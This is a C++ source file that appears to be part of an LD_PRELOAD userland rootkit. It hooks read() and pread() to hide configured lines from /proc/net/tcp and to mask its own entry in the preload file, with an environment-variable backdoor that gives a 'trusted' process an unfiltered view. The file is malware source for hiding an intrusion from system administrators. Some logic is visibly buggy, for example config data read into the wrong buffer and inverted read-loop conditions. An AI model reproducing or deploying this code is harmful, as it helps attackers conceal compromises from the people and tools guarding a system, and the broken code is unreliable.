
#include "main.h"


static std::string buf;
static size_t bufSize = 4096;
static size_t totalRead, doneLen;
static int oldFd = -1;
static bool nullFlag;



void removeNeedStrings (const std::string & hideStr, std::string & buf) {
	std::list <std::string> strDat;
	typename std::string::size_type posEnd = 0, posBeg = 0;
	char chNew = '\n', chRet = '\r';
	
	
	while ((posEnd = hideStr.find (chNew, posBeg)) != std::string::npos) {
		posEnd--;
		if (hideStr[posEnd] == chRet) --posEnd;
		strDat.insert (strDat.begin (), 
					   std::string (hideStr,
									posBeg,
									posEnd - posBeg + 1
					   )
		);
		
		if (hideStr[posEnd + 1] == chRet) ++posEnd;
		posBeg = posEnd + 2;
	}
	
	std::list <std::string>::iterator beg = strDat.begin (), end = strDat.end ();
	while (beg != end) {
		posBeg = posEnd = 0;
		if ((posBeg = buf.find (*beg, posBeg)) != std::string::npos) {
			posEnd = buf.find (chNew, posBeg);
			buf.erase (posBeg, posEnd - posBeg + 1);
		}
		++beg;
	}
	
	
	return;
}

ssize_t processTcp4Reading (int fd, void *bufPtr, size_t count) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	ssize_t ret, totLen = 0;
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	
	if (nullFlag && fd == oldFd) {
		nullFlag = false;
		return 0;
	} else
		nullFlag = false;
	
	if (!totalRead || fd != oldFd) {
		oldFd = fd;
		totalRead = doneLen = 0;
		buf.resize (bufSize);
		while (-1 == (ret = rdPtr (fd, &buf[totLen], buf.size () - totLen - 1)) && errno == EINTR) {
			if (ret == -1 && errno != 0 && errno != EINTR) {
				serr.set (errno);
				return -1;
			}
			if (ret != 0) {
				buf.resize (buf.size () * 2);
				totLen += ret;
			} else {
				// we have got 0, so we have reached the end of the file
				buf[totLen] = '\0';
				break;
			}
		}
		
		std::string hideStr;
		descr_holder fd_t (new int (-1));
		
		*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd_t);
		
		totLen = 0;
		hideStr.resize (bufSize);
		while (-1 == (ret = rdPtr (*fd_t, &buf[totLen], buf.size () - totLen - 1)) && errno == EINTR) {
			if (ret == -1 && errno != 0 && errno != EINTR) {
				serr.set (errno);
				return -1;
			}
			if (ret != 0) {
				buf.resize (buf.size () * 2);
				totLen += ret;
			} else {
				// we have got 0, so we have reached the end of the file
				buf[totLen] = '\0';
				break;
			}
		}
		
		removeNeedStrings (hideStr, buf);
		totalRead = buf.size ();
	}
	
	if (count >= totalRead) {
		for (size_t i = 0; i < totalRead; ++i)
			static_cast <char*> (bufPtr)[i] = buf[doneLen + i];
		totLen = totalRead;
		totalRead = doneLen = 0;
		if (totLen) nullFlag = true;
	} else {
		for (size_t i = 0; i < count; ++i)
			static_cast <char*> (bufPtr)[i] = buf[doneLen + i];
		totLen = count;
		doneLen += count;
		totalRead -= count;
	}
	
	
	return totLen;
}

ssize_t processTcp4Reading (int fd, void *buf, size_t count, off_t offset) {
	//
	// /proc/net/tcp is special file, that hasn't a size, like ordinary
	// regular file, so we thik that pread will npt be used, to read it.
	// If in true, it's very lazy for me to realize this :)
	//
	return 0;
}

ssize_t read (int fd, void *buf, size_t count) {
	CErrnoSaver serr;
	std::string lnkAim, tcp4Str (tcp4Path);
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	LSEEK lskPtr = (LSEEK)dlsym (RTLD_NEXT, "lseek");
	char *chPtr;
	ssize_t ret;
	

	assert (lskPtr != NULL);
	assert (rdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = rdPtr (fd, buf, count)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if (-1 == lskPtr (fd, (hookLibraryName + separator).size (), SEEK_CUR)) {
			serr.set (EBADF);
			return -1;
		}
	} else if (tcp4Str == lnkAim || haveTcp4Relation (fd)) {
		if (-1 == (ret = processTcp4Reading (fd, buf, count))) {
			serr.set (errno);
		}
		return ret;
	}
	
	
	if ((ret = rdPtr (fd, buf, count)) == -1) {
		serr.set (errno);
	}
	return ret;
}

ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
	CErrnoSaver serr;
	std::string lnkAim;
	PREAD prdPtr = (PREAD)dlsym (RTLD_NEXT, "pread");
	char *chPtr;
	ssize_t ret;
	

	assert (prdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if ((ret = prdPtr (fd, buf, count, offset + (hookLibraryName + separator).size ()))) {
			serr.set (errno);
		}
		return ret;
	} else if (tcp4Path == lnkAim || haveTcp4Relation (fd)) {
		if (-1 == (ret = processTcp4Reading (fd, buf, count))) {
			serr.set (errno);
		}
		return ret;
	}
	
	
	if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
		serr.set (errno);
	}
	return ret;
}








